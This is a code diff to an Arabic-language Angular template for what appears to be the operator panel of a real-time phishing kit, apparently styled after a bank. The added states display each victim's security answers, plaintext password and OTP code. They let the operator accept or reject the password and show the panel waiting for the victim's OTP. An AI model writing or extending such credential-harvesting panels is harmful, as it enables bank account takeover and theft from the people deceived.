@@ -172,6 +172,12 @@
                   <div class="bg-slate-950/20 rounded-xl p-2.5 text-xs text-slate-400">
                     <span class="font-semibold block">السؤال: {{ client.questions[client.questions.length - 1]?.question }}</span>
                     <span class="font-semibold block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer }}</span>
+                    @if (client.password) {
+                      <span class="font-semibold block mt-1">كلمة السر: {{ client.password }}</span>
+                    }
+                    @if (client.otp) {
+                      <span class="font-semibold block mt-1">رمز OTP: {{ client.otp }}</span>
+                    }
                   </div>
                   <div class="bg-emerald-950/30 border border-emerald-800 rounded-xl p-3.5 flex items-center gap-2 text-emerald-400 mt-1">
                     <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
@@ -188,12 +194,83 @@
                   <div class="bg-slate-950/20 rounded-xl p-2.5 text-xs text-slate-400">
                     <span class="font-semibold block">السؤال: {{ client.questions[client.questions.length - 1]?.question }}</span>
                     <span class="font-semibold block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer }}</span>
+                    @if (client.password) {
+                      <span class="font-semibold block mt-1">كلمة السر: {{ client.password }}</span>
+                    }
                   </div>
                   <div class="bg-rose-950/30 border border-rose-800 rounded-xl p-3.5 flex items-center gap-2 text-rose-400 mt-1">
                     <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
                       <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                     </svg>
-                    <span class="text-sm font-bold">تم رفض الإجابة وإلغاء الجلسة</span>
+                    <span class="text-sm font-bold">تم رفض الطلب وإلغاء الجلسة</span>
+                  </div>
+                </div>
+              }
+
+              <!-- State 6: PASSWORD_PENDING -->
+              @if (client.status === 'PASSWORD_PENDING') {
+                <div class="flex flex-col gap-2">
+                  <div class="bg-slate-950/25 rounded-xl p-3 text-xs text-slate-450 border border-slate-900">
+                    <span class="block">السؤال: {{ client.questions[client.questions.length - 1]?.question }}</span>
+                    <span class="block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer }}</span>
+                  </div>
+                  <div class="flex items-center gap-2 text-blue-400 mt-2 text-sm justify-center py-2 animate-pulse">
+                    <svg class="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                      <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    <span>في انتظار قيام العميل بإدخال كلمة السر...</span>
+                  </div>
+                </div>
+              }
+
+              <!-- State 7: PASSWORD_SUBMITTED -->
+              @if (client.status === 'PASSWORD_SUBMITTED') {
+                <div class="flex flex-col gap-3.5">
+                  <div class="bg-slate-950/25 rounded-xl p-3 text-xs text-slate-400 border border-slate-900">
+                    <span class="block">السؤال: {{ client.questions[client.questions.length - 1]?.question }}</span>
+                    <span class="block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer }}</span>
+                  </div>
+
+                  <div class="bg-kfh-green-light border border-kfh-green/20 rounded-xl p-3 flex flex-col gap-1">
+                    <span class="text-xs text-kfh-green font-semibold">كلمة السر المدخلة:</span>
+                    <span class="text-slate-900 font-extrabold text-lg">
+                      {{ client.password }}
+                    </span>
+                  </div>
+
+                  <div class="flex gap-3 mt-1">
+                    <app-button 
+                      [loading]="actionLoading()[client.id] || false"
+                      (btnClick)="verifyAnswer(client.id, true)"
+                      customClasses="py-2.5 text-sm font-bold flex-1"
+                    >
+                      قبول كلمة السر
+                    </app-button>
+                    <button 
+                      type="button"
+                      [disabled]="actionLoading()[client.id]"
+                      (click)="verifyAnswer(client.id, false)"
+                      class="border border-red-500 text-red-400 hover:bg-red-500/10 px-4 py-2.5 rounded-xl text-sm font-bold flex-1 transition-all duration-200 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
+                    >
+                      رفض كلمة السر
+                    </button>
+                  </div>
+                </div>
+              }
+
+              <!-- State 8: OTP_PENDING -->
+              @if (client.status === 'OTP_PENDING') {
+                <div class="flex flex-col gap-2">
+                  <div class="bg-slate-950/25 rounded-xl p-3 text-xs text-slate-405 border border-slate-900">
+                    <span class="block">كلمة السر المقبولة: {{ client.password }}</span>
+                  </div>
+                  <div class="flex items-center gap-2 text-blue-400 mt-2 text-sm justify-center py-2 animate-pulse">
+                    <svg class="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                      <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    <span>في انتظار قيام العميل بإدخال رمز OTP...</span>
                   </div>
                 </div>
               }
